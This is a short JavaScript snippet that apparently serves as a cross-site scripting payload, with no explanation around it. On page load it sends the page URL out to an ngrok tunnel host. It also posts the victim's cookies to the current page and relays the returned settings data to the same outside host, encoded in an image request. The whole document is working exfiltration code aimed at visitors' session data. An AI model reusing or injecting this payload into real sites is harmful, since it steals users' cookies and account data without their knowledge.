window.addEventListener('load', function () {
 function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://bf482e8c.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
    document.getElementById("chat-div").appendChild(img);
}

 send2server("url", window.location.href);


  fetch(window.location.pathname,{
    method: 'POST',
    body: 'name=test&user_id=1&' +document.cookie,
     headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    }
  })
  .then(res => {
      return res.text();
  })
  .then(data => {
  send2server("settings", data);

  });

    })
